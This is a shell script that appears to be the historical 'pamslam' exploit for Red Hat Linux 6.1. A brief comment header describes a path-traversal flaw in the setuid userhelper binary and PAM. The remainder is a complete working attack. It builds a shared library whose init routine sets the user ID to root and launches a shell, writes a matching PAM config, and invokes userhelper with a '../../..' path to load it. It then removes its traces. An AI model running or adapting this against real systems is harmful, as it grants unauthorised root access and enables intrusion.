#!/bin/sh
#
# pamslam - vulnerability in Redhat Linux 6.1 and PAM pam_start
# found by dildog@l0pht.com
#  
# synopsis:
#    both 'pam' and 'userhelper' (a setuid binary that comes with the
#    'usermode-1.15' rpm) follow .. paths. Since pam_start calls down to
#    _pam_add_handler(), we can get it to dlopen any file on disk. 'userhelper'
#    being setuid means we can get root. 
#
# fix: 
#    No fuckin idea for a good fix. Get rid of the .. paths in userhelper 
#    for a quick fix. Remember 'strcat' isn't a very good way of confining
#    a path to a particular subdirectory.
#
# props to my mommy and daddy, cuz they made me drink my milk.

cat > _pamslam.c << EOF
#include<stdlib.h>
#include<unistd.h>
#include<sys/types.h>
void _init(void)
{
    setuid(geteuid());
    system("/bin/sh");
}
EOF

echo -n .

echo -e auth\\trequired\\t$PWD/_pamslam.so > _pamslam.conf
chmod 755 _pamslam.conf

echo -n .

gcc -fPIC -o _pamslam.o -c _pamslam.c

echo -n o

ld -shared -o _pamslam.so _pamslam.o

echo -n o

chmod 755 _pamslam.so

echo -n O

rm _pamslam.c
rm _pamslam.o

echo O

/usr/sbin/userhelper -w ../../..$PWD/_pamslam.conf

sleep 1s

rm _pamslam.so
rm _pamslam.conf

